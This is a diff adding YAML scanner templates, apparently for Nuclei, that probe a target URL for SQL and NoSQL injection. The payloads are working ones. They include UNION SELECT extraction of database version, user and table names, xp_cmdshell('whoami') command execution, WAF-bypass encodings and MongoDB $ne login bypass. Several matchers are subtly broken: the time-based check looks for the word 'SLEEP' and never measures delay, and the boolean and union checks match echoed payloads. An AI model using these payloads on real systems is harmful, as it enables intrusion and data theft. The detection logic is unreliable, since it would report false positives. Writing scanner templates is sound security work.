@@ -1,0 +1,225 @@
+id: error-based-sqli
+info:
+  name: Error-Based SQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection via error messages from database
+  tags: sqli,error-based
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q='"
+      - "{{BaseURL}}?q=1'"
+      - "{{BaseURL}}?q=1''"
+      - "{{BaseURL}}?q=1%22"
+    matchers:
+      - type: regex
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "MySqlException"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB.*SQL Server"
+          - "ODBC SQL Server Driver"
+          - "error in your SQL syntax"
+          - "You have an error in your SQL"
+          - "Warning.*oci_"
+          - "PostgreSQL.*ERROR"
+          - "Driver.*SQL Server"
+          - "SQLite/JDBCDriver"
+          - "SQLite.Exception"
+          - "System.Data.SQLite"
+          - "org.sqlite."
+        condition: or
+        name: "error-based-sqli"
+---
+id: boolean-blind-sqli
+info:
+  name: Boolean-Based Blind SQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects blind SQLi via boolean condition responses
+  tags: sqli,blind,boolean
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' AND '1'='1"
+      - "{{BaseURL}}?q=1' AND '1'='2"
+      - "{{BaseURL}}?q=1' AND 1=1--"
+      - "{{BaseURL}}?q=1' AND 1=2--"
+    matchers:
+      - type: word
+        words:
+          - "1' AND '1'='1"
+        condition: or
+        name: "boolean-sqli-response-diff"
+---
+id: time-based-sqli
+info:
+  name: Time-Based Blind SQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects blind SQLi via time delay payloads
+  tags: sqli,blind,time-based
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' OR SLEEP(5)--"
+      - "{{BaseURL}}?q=1' WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?q=1' AND SLEEP(5)--"
+      - "{{BaseURL}}?q=1; SELECT SLEEP(5)"
+    matchers:
+      - type: word
+        words:
+          - "SLEEP"
+        name: "time-based-sqli"
+---
+id: union-based-sqli
+info:
+  name: Union-Based SQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection via UNION SELECT payload
+  tags: sqli,union
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' UNION SELECT NULL--"
+      - "{{BaseURL}}?q=1' UNION SELECT 1,2,3--"
+      - "{{BaseURL}}?q=1' UNION ALL SELECT 1,2,3--"
+    matchers:
+      - type: regex
+        regex:
+          - "1.*2.*3"
+          - "NULL"
+        name: "union-based-sqli"
+---
+id: postgres-sqli
+info:
+  name: PostgreSQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects PostgreSQL-specific SQL injection
+  tags: sqli,postgres
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' AND 1=1--"
+      - "{{BaseURL}}?q=1'; SELECT pg_sleep(5);--"
+    matchers:
+      - type: regex
+        regex:
+          - "pg_sleep"
+          - "PostgreSQL"
+        condition: or
+        name: "postgres-sqli"
+---
+id: mssql-sqli
+info:
+  name: MSSQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects MSSQL-specific SQL injection
+  tags: sqli,mssql
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?q=1' HAVING 1=1--"
+      - "{{BaseURL}}?q=1' EXEC xp_cmdshell('whoami')--"
+    matchers:
+      - type: word
+        words:
+          - "WAITFOR"
+          - "HAVING"
+          - "xp_cmdshell"
+        condition: or
+        name: "mssql-sqli"
+---
+id: sqli-waf-bypass
+info:
+  name: SQLi WAF Bypass Techniques
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection using WAF bypass encodings
+  tags: sqli,waf-bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1'/*!*/AND/*!*/1=1--"
+      - "{{BaseURL}}?q=1'/**/AND/**/1=1--"
+      - "{{BaseURL}}?q=1'AND%201%3D1--"
+      - "{{BaseURL}}?q=1' A%ND 1=1--"
+      - "{{BaseURL}}?q=1'%20AND%201=1--"
+    matchers:
+      - type: word
+        words:
+          - "AND 1=1"
+          - "A%ND 1=1"
+        condition: or
+        name: "sqli-waf-bypass"
+---
+id: second-order-sqli
+info:
+  name: Second Order SQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects second-order SQL injection via stored payload
+  tags: sqli,second-order
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    body: "name=test' OR '1'='1&email=test@test.com"
+    matchers:
+      - type: word
+        words:
+          - "OR '1'='1"
+        name: "second-order-sqli"
+---
+id: nosql-injection
+info:
+  name: NoSQL Injection
+  author: AniipID
+  severity: critical
+  description: Detects NoSQL injection in MongoDB/Express apps
+  tags: sqli,nosql,mongodb
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q[$ne]=admin"
+      - "{{BaseURL}}?q[$gt]="
+      - "{{BaseURL}}?q[$regex]=.*"
+      - "{{BaseURL}}?user[$ne]=admin&pass[$ne]=admin"
+    matchers:
+      - type: word
+        words:
+          - "$ne"
+          - "$gt"
+          - "$regex"
+        condition: or
+        name: "nosql-injection"
+---
+id: sqli-data-exfil
+info:
+  name: SQLi Data Exfiltration
+  author: AniipID
+  severity: critical
+  description: Detects SQL injection capable of data extraction
+  tags: sqli,exfiltration
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=1' UNION SELECT @@version--"
+      - "{{BaseURL}}?q=1' UNION SELECT database()--"
+      - "{{BaseURL}}?q=1' UNION SELECT user()--"
+      - "{{BaseURL}}?q=1' UNION SELECT table_name FROM information_schema.tables--"
+    matchers:
+      - type: regex
+        regex:
+          - "version"
+          - "database()"
+          - "user()"
+          - "table_name"
+        condition: or
+        name: "sqli-data-exfil"
